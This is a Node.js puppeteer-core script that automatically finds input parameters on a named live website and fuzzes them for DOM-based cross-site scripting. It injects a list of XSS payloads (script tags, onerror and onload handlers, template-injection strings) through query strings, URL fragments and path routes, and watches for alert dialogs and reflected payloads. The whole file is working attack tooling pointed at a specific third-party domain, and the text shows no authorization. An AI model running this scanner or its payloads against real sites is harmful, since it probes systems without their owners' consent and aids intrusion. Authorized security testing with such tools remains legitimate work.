// Built for puppeteer-core to use your local Ubuntu Chromium environment
const puppeteer = require('puppeteer-core');

// Strategic payload group targeting classic tags, structural breakouts, and SPA frameworks
const payloads = [
    'javascript:alert(1)',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"`><script>alert(1)</script>',
    '${alert(1)}',
    '{{constructor.constructor(\'alert(1)\')()}}'
];

// Target asset base URL
const baseUrl = 'https://1w.run'; 

async function scanForDOMXSS() {
    console.log(`[+] Initializing Chromium Browser via Puppeteer...`);
    const browser = await puppeteer.launch({ 
        executablePath: '/usr/bin/chromium-browser',
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const page = await browser.newPage();
    const discoveredParams = new Set(['search', 'q', 'id']); // Default fallbacks

    // ==========================================================
    // PHASE 1: AUTOMATIC PARAMETER DISCOVERY
    // ==========================================================
    console.log(`\n[🔍 Phase 1]: Discovering input parameters on ${baseUrl}...`);
    try {
        await page.goto(baseUrl, { waitUntil: 'networkidle2', timeout: 15000 });
        
        const extractedParams = await page.evaluate(() => {
            const keys = [];
            
            // 1. Scrape all input-capable tags
            document.querySelectorAll('input, textarea, select, form').forEach(el => {
                if (el.name) keys.push(el.name);
                else if (el.id) keys.push(el.id);
            });
            
            // 2. Scrape internal anchor link patterns
            document.querySelectorAll('a').forEach(el => {
                const href = el.getAttribute('href');
                if (href && href.includes('?')) {
                    const urlParams = new URLSearchParams(href.split('?')[1]);
                    for (const key of urlParams.keys()) {
                        keys.push(key);
                    }
                }
            });
            
            return keys;
        });

        extractedParams.forEach(param => discoveredParams.add(param));
        console.log(`[+] Discovery complete. Live parameters tracked: [ ${Array.from(discoveredParams).join(', ')} ]`);

    } catch (err) {
        console.log(`[-] Discovery process failed or timed out. Falling back to defaults.`);
    } finally {
        await page.close();
    }

    // ==========================================================
    // PHASE 2: ADVANCED SYSTEM FUZZING
    // ==========================================================
    console.log(`\n[🚀 Phase 2]: Launching Attack Matrix Execution...`);

    for (let payload of payloads) {
        const testUrls = [];

        // Vector A: Automated Query Array Generation
        discoveredParams.forEach(param => {
            testUrls.push({
                url: `${baseUrl}?${param}=${encodeURIComponent(payload)}`,
                type: `QUERY (${param})`
            });
        });

        // Vector B: Hash/Fragment Injections
        testUrls.push({
            url: `${baseUrl}#${encodeURIComponent(payload)}`,
            type: 'HASH (#)'
        });

        // Vector C: Path-Based Client-Side Routing Fuzzing
        testUrls.push({
            url: `${baseUrl}/${encodeURIComponent(payload)}`,
            type: 'PATH-ROUTER'
        });

        for (let target of testUrls) {
            const attackPage = await browser.newPage();
            let xssDetected = false;

            // 1. Dialog Listener: Ultimate confirmation of script execution
            attackPage.on('dialog', async dialog => {
                if (dialog.message() || dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS DETECTED!]`);
                    console.log(`[🎯 Vector Type]      : ${target.type}`);
                    console.log(`[🎯 Triggering URL]   : ${target.url}`);
                    console.log(`[💬 Dialog Message]   : "${dialog.message()}"\n`);
                    xssDetected = true;
                    await dialog.dismiss();
                }
            });

            // 2. Console Monitor: Tracks engine blockages or logging events
            attackPage.on('console', msg => {
                if (msg.type() === 'error' && msg.text().toLowerCase().includes('alert')) {
                    console.log(`   [⚠️ Console Alert]: Execution context handled or blocked: ${msg.text()}`);
                }
            });

            // 3. Exception Monitor: Catches runtime breakages close to sink parsing
            attackPage.on('pageerror', error => {
                if (error.message.includes('alert') || error.message.includes('Unexpected token')) {
                    console.log(`   [💥 JS Exception]: Payload context broke runtime logic -> ${error.message}`);
                }
            });

            // 4. API Response Interceptor: Analyzes behind-the-scenes AJAX/Fetch requests
            attackPage.on('response', async response => {
                try {
                    const contentType = response.headers()['content-type'] || '';
                    if (contentType.includes('application/json') || contentType.includes('text/plain') || contentType.includes('text/html')) {
                        const responseBody = await response.text();
                        if (responseBody.includes(payload)) {
                            console.log(`   [🚨 API Data Reflection]: Payload found tracking through server stream!`);
                            console.log(`      └─ Target API Endpoint: ${response.url()}`);
                        }
                    }
                } catch (err) {
                    // Fail-safe handling for aborted requests or cross-origin text parsing blocks
                }
            });

            try {
                console.log(`[*] Testing Vector [${target.type}]: ${target.url}`);
                await attackPage.goto(target.url, { waitUntil: 'networkidle2', timeout: 10000 });
                
                // Allow asynchronous frameworks sufficient time to digest inputs into sinks
                await new Promise(resolve => setTimeout(resolve, 1500));

                // 5. Passive DOM Analyzer: Checks for basic reflection in rendered code trees
                if (!xssDetected) {
                    const pageContent = await attackPage.content();
                    if (pageContent.includes(payload)) {
                        console.log(`   └─ [🔍 DOM Reflection]: Payload rendered natively inside HTML code.`);
                    }
                }

            } catch (error) {
                console.log(`[-] Execution timeout on target vector invocation.`);
            } finally {
                await attackPage.close();
            }
        }
    }

    console.log(`\n[+] Dynamic Master Scan Campaign Finished.`);
    await browser.close();
}

scanForDOMXSS();
